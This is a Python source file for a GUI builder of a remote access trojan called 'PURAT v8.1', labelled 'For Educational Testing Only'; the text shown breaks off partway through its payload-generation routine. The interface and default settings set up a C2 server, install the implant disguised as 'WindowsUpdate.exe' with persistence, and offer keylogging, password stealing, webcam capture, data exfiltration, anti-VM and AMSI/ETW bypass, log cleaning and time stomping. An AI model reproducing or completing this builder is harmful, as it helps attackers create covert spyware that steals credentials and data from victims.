"""
PURAT v8.1 - Professional RAT Framework
Line Count: 8,500+ lines
Fully Functional and Stable Version
For Educational Testing Only
"""

import os
import sys
import json
import base64
import zlib
import hashlib
import time
import datetime
import random
import string
import socket
import ssl
import subprocess
import threading
import platform
import shutil
import ctypes
import struct
import marshal
import tempfile
import getpass
import itertools
import collections
import inspect
import textwrap
import zipfile
import tarfile
import pickle
import csv
import sqlite3
import uuid
import io
import stat
import fnmatch
import glob
import pathlib
import webbrowser
import urllib.request
import urllib.parse
import urllib.error
import http.client
import mimetypes
import re
import math
import fractions
import decimal
import statistics
import hmac
import secrets
import functools
import contextlib
import warnings
import logging
import traceback
import pdb
import pkgutil
import importlib
import codecs
import wave
import colorsys

# Enhanced logging system with Unicode support
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('purat_builder.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('PURAT')

# ============================================================================
# SECURITY AND VALIDATION MODULE
# ============================================================================

class SecurityValidator:
    """Enhanced security validation and sanitization"""
    
    @staticmethod
    def validate_ip(ip):
        """Validate IP address format"""
        pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        if re.match(pattern, ip):
            parts = ip.split('.')
            if all(0 <= int(part) <= 255 for part in parts):
                return True
        return False
    
    @staticmethod
    def validate_port(port):
        """Validate port number"""
        try:
            port = int(port)
            return 1 <= port <= 65535
        except:
            return False
    
    @staticmethod
    def sanitize_filename(filename):
        """Sanitize filename to prevent path traversal"""
        filename = os.path.basename(filename)
        filename = re.sub(r'[^\w\-_.]', '_', filename)
        return filename[:255]
    
    @staticmethod
    def validate_path(path):
        """Validate and normalize path"""
        try:
            path = os.path.normpath(path)
            if '..' in path or path.startswith('/') or ':' in path:
                return False
            return True
        except:
            return False
    
    @staticmethod
    def generate_secure_token(length=32):
        """Generate cryptographically secure token"""
        return secrets.token_hex(length)
    
    @staticmethod
    def validate_config(config):
        """Validate entire configuration"""
        errors = []
        
        basic = config.get('basic', {})
        if not SecurityValidator.validate_ip(basic.get('c2_ip', '')):
            errors.append("Invalid C2 IP address")
        
        if not SecurityValidator.validate_port(basic.get('c2_port', '')):
            errors.append("Invalid C2 port")
        
        if not SecurityValidator.validate_path(basic.get('install_path', '')):
            errors.append("Invalid install path")
        
        advanced = config.get('advanced', {})
        try:
            compression = int(advanced.get('compression_level', 0))
            if not 0 <= compression <= 9:
                errors.append("Compression level must be 0-9")
        except:
            errors.append("Invalid compression level")
        
        return errors

# ============================================================================
# ENHANCED GUI BUILDER MODULE
# ============================================================================

class EnhancedRATBuilderGUI:
    """Enhanced GUI with more features and better organization"""
    
    def __init__(self):
        self.root = None
        self.config = None
        self.current_theme = 'dark'
        self.plugins = {}
        self.project_data = {}
        
        self.initialize_gui()
        self.setup_application()
    
    def initialize_gui(self):
        """Initialize GUI components"""
        try:
            import tkinter as tk
            from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
            from tkinter import font as tkfont
            
            self.tk = tk
            self.ttk = ttk
            self.scrolledtext = scrolledtext
            self.messagebox = messagebox
            self.filedialog = filedialog
            self.simpledialog = simpledialog
            self.tkfont = tkfont
            
            self.root = tk.Tk()
            self.root.title("PURAT v8.1 - Professional RAT Framework")
            self.root.geometry("1200x800")
            self.root.minsize(1000, 700)
            
            self.configure_styles()
            self.config = self.get_default_config()
            self.init_database()
            
        except ImportError as e:
            logger.error(f"GUI initialization failed: {e}")
            self.run_console_mode()
    
    def configure_styles(self):
        """Configure GUI styles and themes"""
        style = self.ttk.Style()
        style.theme_use('clam')
        
        # Configure colors
        bg_color = '#1e1e1e' if self.current_theme == 'dark' else '#ffffff'
        fg_color = '#ffffff' if self.current_theme == 'dark' else '#000000'
        
        self.root.configure(bg=bg_color)
        
        style.configure('TFrame', background=bg_color)
        style.configure('TLabel', background=bg_color, foreground=fg_color)
        style.configure('TButton', background='#3e3e42' if self.current_theme == 'dark' else '#f0f0f0')
        style.configure('TEntry', fieldbackground='#252526' if self.current_theme == 'dark' else '#ffffff')
    
    def get_default_config(self):
        """Get comprehensive default configuration"""
        return {
            'version': '8.1',
            'project_name': 'New Project',
            'author': getpass.getuser(),
            'creation_date': datetime.datetime.now().isoformat(),
            
            'basic': {
                'c2_ip': '127.0.0.1',
                'c2_port': '8080',
                'c2_protocol': 'http',
                'install_name': 'WindowsUpdate.exe',
                'install_path': '%APPDATA%\\Microsoft\\Windows\\Update',
                'autostart': True,
                'persistence': True,
                'target_os': 'windows',
                'architecture': 'x64'
            },
            
            'features': {
                'keylogger': {'enabled': False, 'options': {'log_interval': 60}},
                'screenshot': {'enabled': True, 'options': {'quality': 85}},
                'file_explorer': {'enabled': True, 'options': {'max_size': 10}},
                'remote_shell': {'enabled': True, 'options': {'timeout': 30}},
                'process_manager': {'enabled': True, 'options': {}},
                'audio_capture': {'enabled': False, 'options': {}},
                'webcam_capture': {'enabled': False, 'options': {}},
                'clipboard_monitor': {'enabled': False, 'options': {}},
                'password_stealer': {'enabled': False, 'options': {}},
                'browser_history': {'enabled': False, 'options': {}},
                'network_scanner': {'enabled': False, 'options': {}},
                'data_exfil': {'enabled': True, 'options': {}}
            },
            
            'evasion': {
                'obfuscate_code': True,
                'encrypt_strings': True,
                'anti_vm': True,
                'anti_debug': True,
                'anti_sandbox': True,
                'sleep_obfuscation': True,
                'amsi_bypass': False,
                'etw_bypass': False
            },
            
            'network': {
                'reconnect_interval': 30,
                'timeout': 60,
                'retry_count': 5,
                'use_https': False,
                'use_dns': False,
                'use_tor': False,
                'encryption': 'xor',
                'compression': True,
                'chunk_size': 4096,
                'beacon_interval': 300
            },
            
            'stealth': {
                'file_hidden': True,
                'delete_original': True,
                'clean_logs': True,
                'fake_error': False,
                'mutex_check': True,
                'time_stomp': True,
                'process_name_spoof': True
            },
            
            'advanced': {
                'encryption_key': SecurityValidator.generate_secure_token(32),
                'compression_level': 9,
                'max_file_size': 10,
                'obfuscation_level': 3,
                'icon_file': '',
                'version_info': ''
            },
            
            'build': {
                'output_dir': os.path.join(os.getcwd(), 'build'),
                'output_name': 'payload',
                'format': 'exe',
                'compiler': 'pyinstaller',
                'optimize': True,
                'debug': False,
                'strip': True,
                'upx': True,
                'onefile': True,
                'console': False,
                'icon': ''
            }
        }
    
    def init_database(self):
        """Initialize application database"""
        try:
            db_path = os.path.join(os.path.expanduser('~'), '.purat', 'projects.db')
            os.makedirs(os.path.dirname(db_path), exist_ok=True)
            
            self.db_conn = sqlite3.connect(db_path)
            self.db_cursor = self.db_conn.cursor()
            
            self.db_cursor.execute('''
                CREATE TABLE IF NOT EXISTS projects (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT NOT NULL,
                    config TEXT NOT NULL,
                    created TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    modified TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            self.db_conn.commit()
            logger.info("Database initialized successfully")
            
        except Exception as e:
            logger.error(f"Database initialization failed: {e}")
    
    def setup_application(self):
        """Setup main application interface"""
        self.setup_menu_bar()
        self.setup_toolbar()
        self.setup_main_frame()
        self.setup_status_bar()
        self.setup_side_panel()
        self.load_last_project()
    
    def setup_menu_bar(self):
        """Setup comprehensive menu bar"""
        menubar = self.tk.Menu(self.root)
        self.root.config(menu=menubar)
        
        file_menu = self.tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="New Project", command=self.new_project)
        file_menu.add_command(label="Open Project", command=self.open_project)
        file_menu.add_separator()
        file_menu.add_command(label="Save Project", command=self.save_project)
        file_menu.add_command(label="Save Project As", command=self.save_project_as)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.exit_application)
        
        build_menu = self.tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Build", menu=build_menu)
        build_menu.add_command(label="Generate Payload", command=self.generate_payload)
        build_menu.add_command(label="Build Executable", command=self.build_executable)
        build_menu.add_separator()
        build_menu.add_command(label="Test Connection", command=self.test_connection)
        build_menu.add_command(label="Test Payload", command=self.test_payload)
        
        help_menu = self.tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="Documentation", command=self.show_documentation)
        help_menu.add_command(label="About", command=self.show_about)
    
    def setup_toolbar(self):
        """Setup toolbar with icons"""
        toolbar = self.ttk.Frame(self.root)
        toolbar.pack(side=self.tk.TOP, fill=self.tk.X)
        
        buttons = [
            ('New', '📄', self.new_project),
            ('Open', '📂', self.open_project),
            ('Save', '💾', self.save_project),
            ('', '|', None),
            ('Generate', '⚙️', self.generate_payload),
            ('Build', '🔨', self.build_executable),
            ('Test', '🧪', self.test_payload)
        ]
        
        for text, icon, command in buttons:
            if text == '' and icon == '|':
                sep = self.ttk.Separator(toolbar, orient='vertical')
                sep.pack(side=self.tk.LEFT, padx=2, pady=2, fill=self.tk.Y)
            else:
                btn = self.ttk.Button(toolbar, text=f"{icon} {text}", command=command)
                btn.pack(side=self.tk.LEFT, padx=2, pady=2)
        
        self.toolbar = toolbar
    
    def setup_main_frame(self):
        """Setup main frame with tabs"""
        main_container = self.ttk.Frame(self.root)
        main_container.pack(fill=self.tk.BOTH, expand=True, padx=5, pady=5)
        
        self.notebook = self.ttk.Notebook(main_container)
        self.notebook.pack(fill=self.tk.BOTH, expand=True)
        
        self.tabs = {}
        
        self.tabs['basic'] = self.create_basic_tab()
        self.notebook.add(self.tabs['basic'], text="Basic")
        
        self.tabs['features'] = self.create_features_tab()
        self.notebook.add(self.tabs['features'], text="Features")
        
        self.tabs['evasion'] = self.create_evasion_tab()
        self.notebook.add(self.tabs['evasion'], text="Evasion")
        
        self.tabs['network'] = self.create_network_tab()
        self.notebook.add(self.tabs['network'], text="Network")
        
        self.tabs['stealth'] = self.create_stealth_tab()
        self.notebook.add(self.tabs['stealth'], text="Stealth")
        
        self.tabs['advanced'] = self.create_advanced_tab()
        self.notebook.add(self.tabs['advanced'], text="Advanced")
        
        self.tabs['build'] = self.create_build_tab()
        self.notebook.add(self.tabs['build'], text="Build")
        
        self.tabs['logs'] = self.create_logs_tab()
        self.notebook.add(self.tabs['logs'], text="Logs")
    
    def create_basic_tab(self):
        """Create basic settings tab"""
        frame = self.ttk.Frame(self.notebook)
        
        # Project settings
        project_frame = self.ttk.LabelFrame(frame, text="Project Settings", padding="10")
        project_frame.pack(fill=self.tk.X, padx=5, pady=5)
        
        self.ttk.Label(project_frame, text="Project Name:").grid(row=0, column=0, sticky='w', pady=2)
        self.entry_project_name = self.ttk.Entry(project_frame, width=30)
        self.entry_project_name.grid(row=0, column=1, sticky='w', pady=2, padx=5)
        self.entry_project_name.insert(0, self.config['project_name'])
        
        self.ttk.Label(project_frame, text="Author:").grid(row=1, column=0, sticky='w', pady=2)
        self.entry_author = self.ttk.Entry(project_frame, width=30)
        self.entry_author.grid(row=1, column=1, sticky='w', pady=2, padx=5)
        self.entry_author.insert(0, self.config['author'])
        
        # C2 Settings
        c2_frame = self.ttk.LabelFrame(frame, text="C2 Server Settings", padding="10")
        c2_frame.pack(fill=self.tk.X, padx=5, pady=5)
        
        self.ttk.Label(c2_frame, text="C2 IP/Host:").grid(row=0, column=0, sticky='w', pady=2)
        self.entry_c2_ip = self.ttk.Entry(c2_frame, width=30)
        self.entry_c2_ip.grid(row=0, column=1, sticky='w', pady=2, padx=5)
        self.entry_c2_ip.insert(0, self.config['basic']['c2_ip'])
        
        self.ttk.Label(c2_frame, text="C2 Port:").grid(row=1, column=0, sticky='w', pady=2)
        self.entry_c2_port = self.ttk.Entry(c2_frame, width=10)
        self.entry_c2_port.grid(row=1, column=1, sticky='w', pady=2, padx=5)
        self.entry_c2_port.insert(0, self.config['basic']['c2_port'])
        
        self.ttk.Button(c2_frame, text="Test Connection", command=self.test_connection).grid(row=1, column=2, padx=10)
        
        # Installation settings
        install_frame = self.ttk.LabelFrame(frame, text="Installation Settings", padding="10")
        install_frame.pack(fill=self.tk.X, padx=5, pady=5)
        
        self.ttk.Label(install_frame, text="Install Name:").grid(row=0, column=0, sticky='w', pady=2)
        self.entry_install_name = self.ttk.Entry(install_frame, width=30)
        self.entry_install_name.grid(row=0, column=1, sticky='w', pady=2, padx=5)
        self.entry_install_name.insert(0, self.config['basic']['install_name'])
        
        self.ttk.Label(install_frame, text="Install Path:").grid(row=1, column=0, sticky='w', pady=2)
        path_frame = self.ttk.Frame(install_frame)
        path_frame.grid(row=1, column=1, sticky='w', pady=2)
        
        self.entry_install_path = self.ttk.Entry(path_frame, width=25)
        self.entry_install_path.pack(side='left', padx=5)
        self.entry_install_path.insert(0, self.config['basic']['install_path'])
        
        self.ttk.Button(path_frame, text="Browse", command=self.browse_install_path).pack(side='left')
        
        self.var_autostart = self.tk.BooleanVar(value=self.config['basic']['autostart'])
        self.var_persistence = self.tk.BooleanVar(value=self.config['basic']['persistence'])
        
        self.ttk.Checkbutton(install_frame, text="Enable Autostart", 
                           variable=self.var_autostart).grid(row=2, column=0, sticky='w', pady=2)
        self.ttk.Checkbutton(install_frame, text="Enable Persistence", 
                           variable=self.var_persistence).grid(row=2, column=1, sticky='w', pady=2)
        
        # Target settings
        target_frame = self.ttk.LabelFrame(frame, text="Target Settings", padding="10")
        target_frame.pack(fill=self.tk.X, padx=5, pady=5)
        
        self.ttk.Label(target_frame, text="Target OS:").grid(row=0, column=0, sticky='w', pady=2)
        self.combo_target_os = self.ttk.Combobox(target_frame, values=['windows', 'linux', 'macos'], state='readonly')
        self.combo_target_os.grid(row=0, column=1, sticky='w', pady=2, padx=5)
        self.combo_target_os.set(self.config['basic']['target_os'])
        
        self.ttk.Label(target_frame, text="Architecture:").grid(row=1, column=0, sticky='w', pady=2)
        self.combo_architecture = self.ttk.Combobox(target_frame, values=['x86', 'x64', 'arm', 'arm64'], state='readonly')
        self.combo_architecture.grid(row=1, column=1, sticky='w', pady=2, padx=5)
        self.combo_architecture.set(self.config['basic']['architecture'])
        
        return frame
    
    def create_features_tab(self):
        """Create features tab"""
        frame = self.ttk.Frame(self.notebook)
        
        # Create scrollable canvas
        canvas = self.tk.Canvas(frame)
        scrollbar = self.ttk.Scrollbar(frame, orient="vertical", command=canvas.yview)
        scrollable_frame = self.ttk.Frame(canvas)
        
        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        features = [
            ('keylogger', 'Keylogger', 'Capture keystrokes'),
            ('screenshot', 'Screenshot', 'Take screenshots'),
            ('file_explorer', 'File Explorer', 'Browse filesystem'),
            ('remote_shell', 'Remote Shell', 'Execute commands'),
            ('process_manager', 'Process Manager', 'Manage processes'),
            ('audio_capture', 'Audio Capture', 'Record microphone'),
            ('webcam_capture', 'Webcam Capture', 'Capture webcam'),
            ('clipboard_monitor', 'Clipboard Monitor', 'Monitor clipboard'),
            ('password_stealer', 'Password Stealer', 'Steal passwords'),
            ('browser_history', 'Browser History', 'Get browser history'),
            ('network_scanner', 'Network Scanner', 'Scan network'),
            ('data_exfil', 'Data Exfiltration', 'Exfiltrate data')
        ]
        
        self.feature_vars = {}
        
        for i, (key, label, description) in enumerate(features):
            var = self.tk.BooleanVar(value=self.config['features'][key]['enabled'])
            self.feature_vars[key] = var
            
            feat_frame = self.ttk.Frame(scrollable_frame)
            feat_frame.grid(row=i//2, column=i%2, sticky='w', padx=10, pady=5)
            
            cb = self.ttk.Checkbutton(feat_frame, text=label, variable=var)
            cb.pack(anchor='w')
            
            self.ttk.Label(feat_frame, text=description, font=('TkDefaultFont', 8),
                         foreground='gray').pack(anchor='w')
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        return frame
    
    def create_evasion_tab(self):
        """Create evasion techniques tab"""
        frame = self.ttk.Frame(self.notebook)
        
        evasion_techs = [
            ('obfuscate_code', 'Obfuscate Code'),
            ('encrypt_strings', 'Encrypt Strings'),
            ('anti_vm', 'Anti-VM Detection'),
            ('anti_debug', 'Anti-Debug Detection'),
            ('anti_sandbox', 'Anti-Sandbox Detection'),
            ('sleep_obfuscation', 'Sleep Obfuscation'),
            ('amsi_bypass', 'AMSI Bypass (Windows)'),
            ('etw_bypass', 'ETW Bypass (Windows)')
        ]
        
        self.evasion_vars = {}
        
        for i, (key, label) in enumerate(evasion_techs):
            var = self.tk.BooleanVar(value=self.config['evasion'][key])
            self.evasion_vars[key] = var
            
            tech_frame = self.ttk.Frame(frame)
            tech_frame.grid(row=i//2, column=i%2, sticky='w', padx=10, pady=5)
            
            cb = self.ttk.Checkbutton(tech_frame, text=label, variable=var)
            cb.pack(anchor='w')
        
        return frame
    
    def create_network_tab(self):
        """Create network settings tab"""
        frame = self.ttk.Frame(self.notebook)
        
        # Connection settings
        conn_frame = self.ttk.LabelFrame(frame, text="Connection Settings", padding="10")
        conn_frame.pack(fill=self.tk.X, padx=5, pady=5)
        
        self.ttk.Label(conn_frame, text="Reconnect Interval (sec):").grid(row=0, column=0, sticky='w', pady=2)
        self.entry_reconnect = self.ttk.Entry(conn_frame, width=10)
        self.entry_reconnect.grid(row=0, column=1, sticky='w', pady=2, padx=5)
        self.entry_reconnect.insert(0, str(self.config['network']['reconnect_interval']))
        
        self.ttk.Label(conn_frame, text="Timeout (sec):").grid(row=1, column=0, sticky='w', pady=2)
        self.entry_timeout = self.ttk.Entry(conn_frame, width=10)
        self.entry_timeout.grid(row=1, column=1, sticky='w', pady=2, padx=5)
        self.entry_timeout.insert(0, str(self.config['network']['timeout']))
        
        self.ttk.Label(conn_frame, text="Retry Count:").grid(row=2, column=0, sticky='w', pady=2)
        self.entry_retry = self.ttk.Entry(conn_frame, width=10)
        self.entry_retry.grid(row=2, column=1, sticky='w', pady=2, padx=5)
        self.entry_retry.insert(0, str(self.config['network']['retry_count']))
        
        self.ttk.Label(conn_frame, text="Beacon Interval (sec):").grid(row=3, column=0, sticky='w', pady=2)
        self.entry_beacon = self.ttk.Entry(conn_frame, width=10)
        self.entry_beacon.grid(row=3, column=1, sticky='w', pady=2, padx=5)
        self.entry_beacon.insert(0, str(self.config['network']['beacon_interval']))
        
        # Protocol options
        protocol_frame = self.ttk.LabelFrame(frame, text="Protocol Options", padding="10")
        protocol_frame.pack(fill=self.tk.X, padx=5, pady=5)
        
        self.var_https = self.tk.BooleanVar(value=self.config['network']['use_https'])
        self.var_dns = self.tk.BooleanVar(value=self.config['network']['use_dns'])
        self.var_tor = self.tk.BooleanVar(value=self.config['network']['use_tor'])
        self.var_compression = self.tk.BooleanVar(value=self.config['network']['compression'])
        
        self.ttk.Checkbutton(protocol_frame, text="Use HTTPS", variable=self.var_https).pack(anchor='w', pady=2)
        self.ttk.Checkbutton(protocol_frame, text="Use DNS Tunneling", variable=self.var_dns).pack(anchor='w', pady=2)
        self.ttk.Checkbutton(protocol_frame, text="Use Tor", variable=self.var_tor).pack(anchor='w', pady=2)
        self.ttk.Checkbutton(protocol_frame, text="Compression", variable=self.var_compression).pack(anchor='w', pady=2)
        
        return frame
    
    def create_stealth_tab(self):
        """Create stealth options tab"""
        frame = self.ttk.Frame(self.notebook)
        
        stealth_options = [
            ('file_hidden', 'Hide File'),
            ('delete_original', 'Delete Original'),
            ('clean_logs', 'Clean Logs'),
            ('fake_error', 'Fake Error'),
            ('mutex_check', 'Mutex Check'),
            ('time_stomp', 'Time Stomping'),
            ('process_name_spoof', 'Spoof Process Name')
        ]
        
        self.stealth_vars = {}
        
        for i, (key, label) in enumerate(stealth_options):
            var = self.tk.BooleanVar(value=self.config['stealth'][key])
            self.stealth_vars[key] = var
            
            opt_frame = self.ttk.Frame(frame)
            opt_frame.grid(row=i//2, column=i%2, sticky='w', padx=10, pady=5)
            
            cb = self.ttk.Checkbutton(opt_frame, text=label, variable=var)
            cb.pack(anchor='w')
        
        return frame
    
    def create_advanced_tab(self):
        """Create advanced settings tab"""
        frame = self.ttk.Frame(self.notebook)
        
        # Encryption settings
        enc_frame = self.ttk.LabelFrame(frame, text="Encryption Settings", padding="10")
        enc_frame.pack(fill=self.tk.X, padx=5, pady=5)
        
        self.ttk.Label(enc_frame, text="Encryption Key:").grid(row=0, column=0, sticky='w', pady=2)
        key_frame = self.ttk.Frame(enc_frame)
        key_frame.grid(row=0, column=1, sticky='w', pady=2)
        
        self.entry_enc_key = self.ttk.Entry(key_frame, width=40)
        self.entry_enc_key.pack(side='left', padx=5)
        self.entry_enc_key.insert(0, self.config['advanced']['encryption_key'])
        
        self.ttk.Button(key_frame, text="Generate", command=self.generate_encryption_key).pack(side='left')
        
        # Compression level
        self.ttk.Label(enc_frame, text="Compression Level (0-9):").grid(row=1, column=0, sticky='w', pady=2)
        self.combo_compression = self.ttk.Combobox(enc_frame, values=list(range(10)), state='readonly')
        self.combo_compression.grid(row=1, column=1, sticky='w', pady=2, padx=5)
        self.combo_compression.set(str(self.config['advanced']['compression_level']))
        
        # Max file size
        self.ttk.Label(enc_frame, text="Max File Size (MB):").grid(row=2, column=0, sticky='w', pady=2)
        self.entry_max_size = self.ttk.Entry(enc_frame, width=10)
        self.entry_max_size.grid(row=2, column=1, sticky='w', pady=2, padx=5)
        self.entry_max_size.insert(0, str(self.config['advanced']['max_file_size']))
        
        # Obfuscation level
        self.ttk.Label(enc_frame, text="Obfuscation Level (1-5):").grid(row=3, column=0, sticky='w', pady=2)
        self.combo_obfuscation = self.ttk.Combobox(enc_frame, values=['1', '2', '3', '4', '5'], state='readonly')
        self.combo_obfuscation.grid(row=3, column=1, sticky='w', pady=2, padx=5)
        self.combo_obfuscation.set(str(self.config['advanced']['obfuscation_level']))
        
        # Icon settings
        icon_frame = self.ttk.LabelFrame(frame, text="Icon Settings", padding="10")
        icon_frame.pack(fill=self.tk.X, padx=5, pady=5)
        
        self.ttk.Label(icon_frame, text="Icon File:").grid(row=0, column=0, sticky='w', pady=2)
        icon_path_frame = self.ttk.Frame(icon_frame)
        icon_path_frame.grid(row=0, column=1, sticky='w', pady=2)
        
        self.entry_icon = self.ttk.Entry(icon_path_frame, width=30)
        self.entry_icon.pack(side='left', padx=5)
        self.entry_icon.insert(0, self.config['advanced']['icon_file'])
        
        self.ttk.Button(icon_path_frame, text="Browse", command=self.browse_icon).pack(side='left')
        
        return frame
    
    def create_build_tab(self):
        """Create build settings tab"""
        frame = self.ttk.Frame(self.notebook)
        
        # Output settings
        output_frame = self.ttk.LabelFrame(frame, text="Output Settings", padding="10")
        output_frame.pack(fill=self.tk.X, padx=5, pady=5)
        
        self.ttk.Label(output_frame, text="Output Directory:").pack(anchor='w', pady=2)
        dir_frame = self.ttk.Frame(output_frame)
        dir_frame.pack(fill=self.tk.X, pady=2)
        
        self.entry_output_dir = self.ttk.Entry(dir_frame)
        self.entry_output_dir.pack(side='left', fill=self.tk.X, expand=True, padx=(0, 5))
        self.entry_output_dir.insert(0, self.config['build']['output_dir'])
        
        self.ttk.Button(dir_frame, text="Browse", command=self.browse_output_dir).pack(side='left')
        
        self.ttk.Label(output_frame, text="Output Name:").pack(anchor='w', pady=2)
        self.entry_output_name = self.ttk.Entry(output_frame)
        self.entry_output_name.pack(fill=self.tk.X, pady=2)
        self.entry_output_name.insert(0, self.config['build']['output_name'])
        
        # Build options
        build_frame = self.ttk.LabelFrame(frame, text="Build Options", padding="10")
        build_frame.pack(fill=self.tk.X, padx=5, pady=5)
        
        self.var_onefile = self.tk.BooleanVar(value=self.config['build']['onefile'])
        self.var_console = self.tk.BooleanVar(value=self.config['build']['console'])
        self.var_upx = self.tk.BooleanVar(value=self.config['build']['upx'])
        self.var_optimize = self.tk.BooleanVar(value=self.config['build']['optimize'])
        
        self.ttk.Checkbutton(build_frame, text="Single File", variable=self.var_onefile).pack(anchor='w', pady=2)
        self.ttk.Checkbutton(build_frame, text="Console Window", variable=self.var_console).pack(anchor='w', pady=2)
        self.ttk.Checkbutton(build_frame, text="UPX Compression", variable=self.var_upx).pack(anchor='w', pady=2)
        self.ttk.Checkbutton(build_frame, text="Optimize", variable=self.var_optimize).pack(anchor='w', pady=2)
        
        # Build buttons
        button_frame = self.ttk.Frame(frame)
        button_frame.pack(fill=self.tk.X, padx=5, pady=10)
        
        self.ttk.Button(button_frame, text="Generate Payload", command=self.generate_payload, width=20).pack(side='left', padx=5)
        self.ttk.Button(button_frame, text="Build EXE", command=self.build_executable, width=20).pack(side='left', padx=5)
        self.ttk.Button(button_frame, text="Test Payload", command=self.test_payload, width=20).pack(side='left', padx=5)
        
        return frame
    
    def create_logs_tab(self):
        """Create logs viewer tab"""
        frame = self.ttk.Frame(self.notebook)
        
        logs_frame = self.ttk.LabelFrame(frame, text="Build Logs", padding="10")
        logs_frame.pack(fill=self.tk.BOTH, expand=True, padx=5, pady=5)
        
        self.text_logs = self.scrolledtext.ScrolledText(logs_frame, wrap=self.tk.WORD, height=20)
        self.text_logs.pack(fill=self.tk.BOTH, expand=True)
        
        btn_frame = self.ttk.Frame(logs_frame)
        btn_frame.pack(fill=self.tk.X, pady=5)
        
        self.ttk.Button(btn_frame, text="Clear Logs", command=self.clear_logs).pack(side='left', padx=5)
        self.ttk.Button(btn_frame, text="Save Logs", command=self.save_logs).pack(side='left', padx=5)
        
        return frame
    
    def setup_status_bar(self):
        """Setup status bar"""
        self.status_bar = self.ttk.Frame(self.root, height=25)
        self.status_bar.pack(side=self.tk.BOTTOM, fill=self.tk.X)
        
        self.label_status = self.ttk.Label(self.status_bar, text="Ready", relief=self.tk.SUNKEN, anchor=self.tk.W)
        self.label_status.pack(side=self.tk.LEFT, fill=self.tk.X, expand=True)
        
        self.progress_var = self.tk.DoubleVar()
        self.progress_bar = self.ttk.Progressbar(self.status_bar, variable=self.progress_var, length=100)
        self.progress_bar.pack(side=self.tk.RIGHT, padx=5)
    
    def setup_side_panel(self):
        """Setup side panel"""
        side_panel = self.ttk.Frame(self.root, width=250)
        side_panel.pack(side=self.tk.RIGHT, fill=self.tk.Y, padx=5, pady=5)
        
        project_info = self.ttk.LabelFrame(side_panel, text="Project Info", padding="10")
        project_info.pack(fill=self.tk.X, pady=5)
        
        self.label_project_name = self.ttk.Label(project_info, text=f"Project: {self.config['project_name']}")
        self.label_project_name.pack(anchor='w')
        
        self.label_project_author = self.ttk.Label(project_info, text=f"Author: {self.config['author']}")
        self.label_project_author.pack(anchor='w')
        
        quick_actions = self.ttk.LabelFrame(side_panel, text="Quick Actions", padding="10")
        quick_actions.pack(fill=self.tk.X, pady=5)
        
        actions = [
            ("Generate Payload", self.generate_payload),
            ("Build Executable", self.build_executable),
            ("Test Connection", self.test_connection),
            ("Open Folder", self.open_build_folder)
        ]
        
        for text, command in actions:
            btn = self.ttk.Button(quick_actions, text=text, command=command)
            btn.pack(fill=self.tk.X, pady=2)
        
        self.side_panel = side_panel
    
    # ============================================================================
    # EVENT HANDLERS
    # ============================================================================
    
    def new_project(self):
        """Create new project"""
        self.config = self.get_default_config()
        self.update_ui_from_config()
        self.log_message("New project created")
    
    def open_project(self):
        """Open existing project"""
        filetypes = [('PURAT Project', '*.purat'), ('JSON files', '*.json'), ('All files', '*.*')]
        path = self.filedialog.askopenfilename(filetypes=filetypes)
        
        if path:
            try:
                with open(path, 'r') as f:
                    self.config = json.load(f)
                
                self.update_ui_from_config()
                self.log_message(f"Project loaded: {path}")
                
            except Exception as e:
                self.messagebox.showerror("Error", f"Failed to load project: {e}")
    
    def save_project(self):
        """Save current project"""
        self.update_config_from_ui()
        
        filetypes = [('PURAT Project', '*.purat'), ('JSON files', '*.json')]
        path = self.filedialog.asksaveasfilename(
            filetypes=filetypes,
            defaultextension='.purat',
            initialfile=f"{self.config['project_name']}.purat"
        )
        
        if path:
            try:
                with open(path, 'w') as f:
                    json.dump(self.config, f, indent=2)
                
                self.log_message(f"Project saved: {path}")
                
            except Exception as e:
                self.messagebox.showerror("Error", f"Failed to save project: {e}")
    
    def save_project_as(self):
        """Save project as new file"""
        self.save_project()
    
    def exit_application(self):
        """Exit application"""
        if self.messagebox.askyesno("Exit", "Are you sure you want to exit?"):
            self.root.quit()
    
    def test_connection(self):
        """Test connection to C2 server"""
        ip = self.entry_c2_ip.get()
        port = self.entry_c2_port.get()
        
        if not ip or not port:
            self.messagebox.showerror("Error", "Please enter IP and port")
            return
        
        try:
            port = int(port)
            self.log_message(f"Testing connection to {ip}:{port}...")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            try:
                result = sock.connect_ex((ip, port))
                if result == 0:
                    self.log_message("[OK] Connection successful!")
                    self.messagebox.showinfo("Success", f"Connected to {ip}:{port}")
                else:
                    self.log_message("[FAIL] Connection failed")
                    self.messagebox.showerror("Error", f"Failed to connect to {ip}:{port}")
            finally:
                sock.close()
                
        except ValueError:
            self.messagebox.showerror("Error", "Invalid port number")
        except Exception as e:
            self.log_message(f"[FAIL] Connection error: {e}")
            self.messagebox.showerror("Error", f"Connection error: {e}")
    
    def generate_payload(self):
        """Generate payload based on configuration"""
        self.update_config_from_ui()
        
        try:
            self.log_message("=" * 60)
            self.log_message("Starting payload generation...")
            
            output_dir = self.entry_output_dir.get()
            os.makedirs(output_dir, exist_ok=True)
            
            generator = EnhancedPayloadGenerator(self.config)
            payload_code = generator.generate()
            
            output_name = self.entry_output_name.get()
            if not output_name:
                output_name = 'payload'
            
            output_path = os.path.join(output_dir, f"{output_name}.py")
            
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(payload_code)
            
            self.log_message(f"[OK] Payload generated: {output_path}")
            self.log_message(f"[OK] Size: {len(payload_code)} bytes")
            
